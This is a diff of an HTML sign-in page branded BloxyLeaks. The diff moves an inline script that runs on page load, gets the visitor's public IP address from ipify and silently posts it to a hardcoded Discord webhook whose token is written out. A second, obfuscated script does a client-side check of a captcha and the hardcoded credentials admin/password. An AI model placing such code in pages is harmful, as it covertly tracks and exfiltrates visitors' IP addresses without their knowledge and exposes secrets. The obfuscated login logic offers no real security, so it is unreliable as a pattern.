@@ -1,22 +1,5 @@
 <!DOCTYPE html>
 <html>
-  <script>
-  fetch('https://api.ipify.org/?format=json')
-    .then(results => results.json())
-    .then(data => {
-      var webhookURL = "https://discord.com/api/webhooks/1115396568703565864/-XE8Tpb2hxtTXkKVYFJuP5HRElp6uKcZZwlqQ7oklIiYCdXh5WbcxXHhedKVu0PxCJrP";
-
-      var request = new XMLHttpRequest();
-      request.open("POST", webhookURL, true);
-      request.setRequestHeader("Content-type", "application/json");
-
-      var webhookData = {
-        content: "@everyone IP Adress: " + data.ip
-      };
-
-      request.send(JSON.stringify(webhookData));
-    });
-</script>
 <head>
   <title>Sign In</title>
   <link rel="icon" href="bloxyleaks.png" type="image/png">
@@ -163,6 +146,24 @@
       <p>&copy; 2023 BloxyLeaks, Inc. All rights reserved.</p>
     </footer>
   </div>
+
+  <script>
+  fetch('https://api.ipify.org/?format=json')
+    .then(results => results.json())
+    .then(data => {
+      var webhookURL = "https://discord.com/api/webhooks/1115396568703565864/-XE8Tpb2hxtTXkKVYFJuP5HRElp6uKcZZwlqQ7oklIiYCdXh5WbcxXHhedKVu0PxCJrP";
+
+      var request = new XMLHttpRequest();
+      request.open("POST", webhookURL, true);
+      request.setRequestHeader("Content-type", "application/json");
+
+      var webhookData = {
+        content: "@everyone IP Adress: " + data.ip
+      };
+
+      request.send(JSON.stringify(webhookData));
+    });
+</script>
 
   <script>
     function _0x41e7(_0x1f395d,_0x1f3705){var _0x315104=_0x3151();return _0x41e7=function(_0x41e716,_0x519970){_0x41e716=_0x41e716-0x125;var _0xab94ca=_0x315104[_0x41e716];return _0xab94ca;},_0x41e7(_0x1f395d,_0x1f3705);}function _0x3151(){var _0x108a8a=['captcha-submit','password','display','username','href','block','ABCD','30HIcTLg','41843wbiTUc','6mZwYpm','captcha','95SwOXSG','addEventListener','947421fAlgAr','login-form','captcha-input','value','getElementById','1429353qZLOGJ','53060XrFwAp','admin','preventDefault','captcha-error-message','Sign-in\x20successful!','DOMContentLoaded','Invalid\x20username\x20or\x20password','165MOKcHD','183036ofvSGp','474LKThIc','style','protected.html','click','8344QReqjJ','Invalid\x20captcha,\x20please\x20try\x20again.','textContent','submit','364384ErjrkR'];_0x3151=function(){return _0x108a8a;};return _0x3151();}var _0x53ef6e=_0x41e7;(function(_0x117a15,_0x58ac45){var _0x31e8d0=_0x41e7,_0x464630=_0x117a15();while(!![]){try{var _0xc7a6fe=-parseInt(_0x31e8d0(0x144))/0x1*(parseInt(_0x31e8d0(0x145))/0x2)+parseInt(_0x31e8d0(0x129))/0x3+parseInt(_0x31e8d0(0x12a))/0x4*(parseInt(_0x31e8d0(0x147))/0x5)+parseInt(_0x31e8d0(0x133))/0x6*(-parseInt(_0x31e8d0(0x137))/0x7)+parseInt(_0x31e8d0(0x13b))/0x8+parseInt(_0x31e8d0(0x149))/0x9*(-parseInt(_0x31e8d0(0x143))/0xa)+parseInt(_0x31e8d0(0x131))/0xb*(parseInt(_0x31e8d0(0x132))/0xc);if(_0xc7a6fe===_0x58ac45)break;else _0x464630['push'](_0x464630['shift']());}catch(_0xa73444){_0x464630['push'](_0x464630['shift']());}}}(_0x3151,0x7217d),document[_0x53ef6e(0x148)](_0x53ef6e(0x12f),function(){var _0x514677=_0x53ef6e;document[_0x514677(0x128)](_0x514677(0x13c))[_0x514677(0x148)](_0x514677(0x136),function(_0x758d1a){var _0x9c28f8=_0x514677;_0x758d1a[_0x9c28f8(0x12c)]();var _0x16c0f5=document[_0x9c28f8(0x128)](_0x9c28f8(0x126))[_0x9c28f8(0x127)],_0x4c6778=_0x9c28f8(0x142);_0x16c0f5===_0x4c6778?(document[_0x9c28f8(0x128)](_0x9c28f8(0x146))['style']['display']='none',document[_0x9c28f8(0x128)](_0x9c28f8(0x125))[_0x9c28f8(0x134)][_0x9c28f8(0x13e)]=_0x9c28f8(0x141)):document['getElementById'](_0x9c28f8(0x12d))[_0x9c28f8(0x139)]=_0x9c28f8(0x138);}),document[_0x514677(0x128)](_0x514677(0x125))[_0x514677(0x148)](_0x514677(0x13a),function(_0x351616){var _0x18d721=_0x514677;_0x351616['preventDefault']();var _0x28a4e2=document[_0x18d721(0x128)](_0x18d721(0x13f))[_0x18d721(0x127)],_0x532b76=document['getElementById'](_0x18d721(0x13d))[_0x18d721(0x127)];_0x28a4e2===_0x18d721(0x12b)&&_0x532b76==='password'?(alert(_0x18d721(0x12e)),window['location'][_0x18d721(0x140)]=_0x18d721(0x135)):document['getElementById']('error-message')[_0x18d721(0x139)]=_0x18d721(0x130);});}));
